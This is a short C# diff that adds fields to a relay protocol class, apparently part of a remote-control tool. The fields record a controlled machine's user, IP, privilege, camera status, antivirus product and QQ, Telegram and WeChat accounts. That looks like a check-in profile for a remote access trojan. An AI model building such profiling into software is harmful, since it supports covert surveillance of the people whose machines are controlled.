@@ -26,5 +26,18 @@ namespace RemoteControl.Protocals.Relay
         /// 上线头像(客户端填写)
         /// </summary>
         public string OnlineAvatar = "";
+
+        public string UserName = "";
+        public string LocalIP = "";
+        public string OSVersion = "";
+        public string Privilege = "";
+        public string CameraStatus = "";
+        public string Antivirus = "";
+        public string OnlineQQ = "";
+        public string TG = "";
+        public string WX = "";
+        public string UserStatus = "";
+        public string Region = "";
+        public string ISP = "";
     }
 }
